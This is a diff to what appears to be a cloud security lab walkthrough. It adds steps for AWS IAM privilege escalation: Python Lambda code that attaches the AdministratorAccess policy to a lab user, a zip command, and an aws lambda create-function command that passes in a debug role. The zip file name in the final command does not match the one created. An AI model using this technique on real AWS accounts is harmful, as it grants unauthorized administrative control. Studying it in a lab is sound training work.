@@ -659,3 +659,31 @@ vi .aws/credentials
 <p align="center">
   <img src="/images/cloud/session_token_lambda.png">
 </p>
+
+* Create a Lambda Function which will **attach** the Administrator Policy to the chris user.
+
+```python
+import boto3
+def lambda_handler(event, context):
+	client = boto3.client('iam')
+	response = client.attach_user_policy(UserName = 'chris-lambda_privesc_cgid2w7yniosir', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
+	return response
+```
+
+**Note:** The name of the file needs to be **lambda_function.py**.
+
+* Save the python file in **zip** format using the following command.
+
+```bash
+zip lambda_function.zip lambda_function.py
+```
+
+* Run the following command to attach the policy.
+
+```aws lambda create-function --function-name admin_function --runtime python3.6 --role <cg-debug-role arn> --handler lambda_function.lambda_handler --zip-file fileb://lambda_function.py.zip --profile lambdamanager
+```
+
+<p align="center">
+  <img src="/images/cloud/creating.png">
+</p>
+
